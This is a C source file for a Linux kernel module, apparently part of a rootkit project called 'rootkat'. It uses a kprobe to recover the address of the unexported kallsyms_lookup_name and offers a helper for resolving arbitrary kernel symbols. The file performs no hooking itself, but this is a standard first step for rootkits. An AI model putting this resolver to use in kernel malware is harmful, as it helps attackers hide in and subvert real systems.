// SPDX-License-Identifier: MIT
#include <linux/kprobes.h>
#include <linux/kernel.h>
#include "kallsyms.h"

#define TAG "rootkat/kallsyms: "

typedef unsigned long (*lookup_fn_t)(const char *name);
static lookup_fn_t lookup_fn;

static int __kprobes noop_pre(struct kprobe *p, struct pt_regs *regs)
{
	return 0;
}

int rootkat_kallsyms_init(void)
{
	struct kprobe kp = {
		.symbol_name = "kallsyms_lookup_name",
		.pre_handler = noop_pre,
	};
	int rc;

	rc = register_kprobe(&kp);
	if (rc < 0) {
		pr_err(TAG "register_kprobe failed: %d\n", rc);
		return rc;
	}
	lookup_fn = (lookup_fn_t)kp.addr;
	unregister_kprobe(&kp);

	if (!lookup_fn) {
		pr_err(TAG "lookup_fn NULL after probe\n");
		return -ENOENT;
	}
	return 0;
}

unsigned long rootkat_lookup_name(const char *name)
{
	if (!lookup_fn)
		return 0;
	return lookup_fn(name);
}
